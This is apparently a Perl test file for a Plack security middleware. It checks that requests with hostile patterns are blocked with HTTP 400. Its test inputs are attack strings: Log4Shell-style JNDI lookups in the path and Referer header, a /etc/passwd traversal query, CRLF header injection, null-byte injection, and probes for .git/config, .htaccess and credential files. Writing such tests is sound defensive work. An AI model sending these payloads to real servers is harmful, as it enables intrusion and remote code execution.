#!perl

use strict;
use warnings;

use Test::More;

use HTTP::Status qw/ :constants :is /;
use HTTP::Request::Common;
use Plack::Builder;
use Plack::Test;

use Hash::Match;
use Plack::Middleware::Security::Common;

my $handler = builder {
    enable "Security::Common",
        rules => [
           -and => [
                -notany => [ PATH_INFO => qr{^/downloads/} ],
                -any => [ archive_extensions ],
            ],
            backup_files,
            cgi_bin,
            cms_prefixes,
            dot_files,
            fake_extensions,
            header_injection,
            ip_address_referer,
            non_printable_chars,
            null_or_escape,
            require_content,
            protocol_in_path_or_referer,
            script_extensions,
            system_dirs,
            unexpected_content,
            webdav_methods,
            wordpress,
        ];

    sub { return [ HTTP_OK, [], ['Ok'] ] };
};

test_psgi
  app    => $handler,
  client => sub {
    my $cb = shift;

    subtest 'blocked IP4 referer' => sub {
        my $req = GET "/";
        $req->header( Referer => 'http://127.0.0.1/' );
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked IP6 referer' => sub {
        my $req = GET "/";
        $req->header( Referer => 'https://2001:db8::2:1/' );
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'not blocked' => sub {
        my $req = GET "/some/thing.html";
        my $res = $cb->($req);
        ok is_success( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_OK, "HTTP_OK";
    };

    subtest 'not blocked (.ps)' => sub {
        my $req = GET "/some/thing.ps";
        my $res = $cb->($req);
        ok is_success( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_OK, "HTTP_OK";
    };

    for my $ext (qw/ asp ash aspx ashx axd bat cfm cgi com dll do exe jsp jspa lua php php5 pl pm ps1 psh psd1 psm1 sh sht shtml sql /) {
        subtest "blocked (.${ext})" => sub {
            my $req = GET "/some/thing.${ext}";
            my $res = $cb->($req);
            ok is_error( $res->code ), join( " ", $req->method, $req->uri );
            is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
        };
    }

    subtest 'blocked' => sub {
        my $req = GET "/some/thing/?file=/etc/passwd";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked fake extension' => sub {
        my $req = GET "/some/thing.ps;.jpg";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked' => sub {
        my $req = GET "/some/wp-login";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked' => sub {
        for my $ext (qw/ iso rar tar uzip zip 7z gz lz xz z tgz /) {
            my $req = GET "/data/backup.${ext}";
            my $res = $cb->($req);
            ok is_error( $res->code ), join( " ", $req->method, $req->uri );
            is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST ($ext)";
        }
    };

    subtest 'not blocked' => sub {
        my $req = GET "/downloads/files.zip";
        my $res = $cb->($req);
        ok is_success( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_OK, "HTTP_OK";
    };

    subtest 'blocked' => sub {
        my $req = GET "/some/thing.php?stuff=1";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked' => sub {
        my $req = POST "/cgi-bin/thing?stuff=1";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked' => sub {
        my $req = POST "/config.ini";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked' => sub {
        my $req = GET "/example.backup";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked' => sub {
        my $req = GET "/example.bkp";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked' => sub {
        my $req = GET "/example.npb";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked' => sub {
        my $req = GET "/example.psc";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'not blocked' => sub {
        my $req = GET "/example.ps";
        my $res = $cb->($req);
        ok is_success( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_OK, "HTTP_OK";
    };

    subtest 'blocked' => sub {
        my $req = GET "/example.old";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked' => sub {
        my $req = POST "/aws.yml";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked' => sub {
        my $req = GET "/example-com-backup.file";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked get with content body' => sub {
        my $req = GET "/some/thing.html";
        $req->content("search=evil hidden payload");
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'non-printable' => sub {
        my $req = GET "/this/thing" . chr(0);
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'non-printable' => sub {
        my $req = GET "/this/thing?q=" . chr(0);
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked' => sub {
        my $req = GET "/admin/.htaccess";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'not blocked' => sub {
        my $req = GET "/.well-known/time";
        my $res = $cb->($req);
        ok is_success( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_OK, "HTTP_OK";
    };

    subtest 'blocked post with no content body' => sub {
        my $req = POST "/some/thing.html";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'not blocked' => sub {
        my $req = POST "/some/thing.html", [ search => 'suff' ];
        my $res = $cb->($req);
        ok is_success( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_OK, "HTTP_OK";
    };

    subtest 'blocked' => sub {
        my $req = GET q[/admin/${jndi:ldap://example.com/}];
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked' => sub {
        my $req = GET "/";
        $req->header( Referer => q[${jndi:ldap://example.com/}] );
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked' => sub {
        my $req = GET q[?unix:|];
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked header injection' => sub {
        my $req = GET q[/%20HTTP/1.1%0d%0aHost:%20example.com%0d%0a%0d%0a ];
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked' => sub {
        my $req = GET "/__MACOSX/.git/config?fcbz=1";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked' => sub {
        my $req = GET "/__MACOSX/test";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

    subtest 'blocked' => sub {
        my $req = GET "/Windows/META-INF/prototype";
        my $res = $cb->($req);
        ok is_error( $res->code ), join( " ", $req->method, $req->uri );
        is $res->code, HTTP_BAD_REQUEST, "HTTP_BAD_REQUEST";
    };

 };

done_testing;
